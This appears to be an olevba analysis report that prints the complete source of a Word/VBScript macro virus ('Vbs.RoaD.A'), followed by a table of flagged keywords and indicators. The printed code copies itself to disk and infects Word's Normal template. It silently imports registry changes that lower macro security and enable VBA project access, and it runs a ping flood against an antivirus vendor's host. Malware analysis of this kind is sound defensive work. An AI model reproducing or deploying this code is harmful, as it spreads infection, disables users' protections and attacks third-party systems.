olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.SecDown-cb8fb133a8dd25d08ebe866fc8457c4eca0b75d5
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan.MSWord.SecDown-cb8fb133a8dd25d08ebe866fc8457c4eca0b75d5 
in file: Trojan.MSWord.SecDown-cb8fb133a8dd25d08ebe866fc8457c4eca0b75d5 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Vbs.RoaD.A
'coded by A.v_killer(PakBrain)
On Error Resume Next
spawn()
sub spawn()
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(wscript.scriptfullname)
f.Copy ("c:\Road.vbs")
f.Copy ("c:\folder\subfolder\...\Road.vbs")
Word()
end sub
sub word()
norm ="Sub document_close()" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Open ""c:\Road.txt"" For Output As 2" & vbCrLf & _
"Print #2, ""sub document_open()""" & vbCrLf & _
"Print #2, ""On Error Resume Next""" & vbCrLf & _
"Print #2, ""'A.v_Killer""" & vbCrLf & _
"Print #2, ""obj = ActiveDocument.Shapes(1).OLEFormat.ClassType""" & vbCrLf & _
"Print #2, ""With ActiveDocument.Shapes(1).OLEFormat""" & vbCrLf & _
"Print #2, ""    .ActivateAs ClassType:=obj""" & vbCrLf & _
"Print #2, ""    .Activate""" & vbCrLf & _
"Print #2, ""End With""" & vbCrLf & _
"Print #2, ""end sub""" & vbCrLf & _
"Close 2" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule" & vbCrLf & _
"Set iw = fso.OpenTextFile(""c:\Road.txt"", 1, True)" & vbCrLf & _
"nt.DeleteLines 1, nt.CountOfLines" & vbCrLf & _
"i = 1 " & vbCrLf & _
"Do While iw.atendofstream <> True" & vbCrLf & _
"b = iw.readline" & vbCrLf & _
"nt.InsertLines i, b " & vbCrLf & _
"i = i + 1 " & vbCrLf & _
"Loop" & vbCrLf & _
"ActiveDocument.Shapes.AddOLEObject _" & vbCrLf & _
"FileName:=""c:\Road.vbs"", _" & vbCrLf & _
"LinkToFile:=False" & vbCrLf & _
"ActiveDocument.Save" & vbCrLf & _
"Open ""c:\Road.reg"" For Output As 3" & vbCrLf & _
"Print #3, ""REGEDIT4""" & vbCrLf & _
"Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]""" & vbCrLf & _
"Print #3, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #3, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]""" & vbCrLf & _
"Print #3, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #3, """"""AccessVBOM""""=dword:00000001""" & vbCrLf & _
"Close 3" & vbCrLf & _
"Shell ""regedit /s c:\Road.reg"", vbHide" & vbCrLf & _
"Kill ""c:\Road.reg""" & vbCrLf & _
"End Sub"
Set fso = CreateObject("Scripting.FileSystemObject")
set f = fso.createtextfile("c:\Road.txt")
f.write norm
f.Close
Set oword = CreateObject("Word.Application")
oword.Visible = False
Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\Road.txt", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
oword.NormalTemplate.Close
Dos()
end sub
sub Dos()
Dim a
Set a = CreateObject("WScript.Shell")
a.run ("c:\windows\ping.exe -t -l 100000 www.avp.ch")
end sub
msgbox "ur suffering from virus", ,"coded by ahsan my real name"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Road.vbs            |Executable file name                         |
|IOC       |Road.reg            |Executable file name                         |
|IOC       |ping.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+
